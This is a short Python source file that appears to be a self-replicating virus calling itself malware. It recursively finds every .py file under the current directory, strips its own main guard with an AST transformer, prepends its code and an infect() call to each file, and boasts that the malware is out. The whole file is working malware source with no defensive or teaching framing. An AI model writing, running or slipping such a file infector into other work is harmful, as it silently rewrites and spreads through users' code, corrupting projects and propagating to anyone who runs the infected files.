import os
import ast
from pathlib import Path


def search(search_dir: str) -> tuple[list, str]:
    py_files = []
    infection_text = ""

    for path in Path(search_dir).rglob('*.py'):
        if path.name == "malware.py":
            with open(path) as f:
                malware_code = f.read()
            infection_text = parse_malware(malware_code)
        else:
            py_files.append(path)
    return py_files, infection_text


def spread(target_list: list, malware_code: str):
    counter = 0
    for target in target_list:
        with open(target) as f:
            content = f.read()

        infected_code = malware_code + '\n' + content + '\ninfect()\n'

        with open(target, "w") as f:
            f.seek(0, 0)
            f.write(infected_code)

        counter += 1

        print(f"File {target.name} has the message!")

    print(f"THE MALWARE IS OUT! {counter} FILES HAVE BEEN INFECTED!")


def parse_malware(malware_text: str) -> str:
    code_tree = ast.parse(malware_text)

    new_tree = RemoveMain().visit(code_tree)

    return ast.unparse(new_tree)



def infect():
    cwd = os.getcwd()

    py_files, malware_code = search(cwd)

    spread(py_files, malware_code)


class RemoveMain(ast.NodeTransformer):
    def visit_If(self, node):
        if isinstance(node.test, ast.Compare) and isinstance(node.test.left, ast.Name):
            if node.test.left.id == "__name__":
                return None
        return node


if __name__ == "__main__":
    infect()
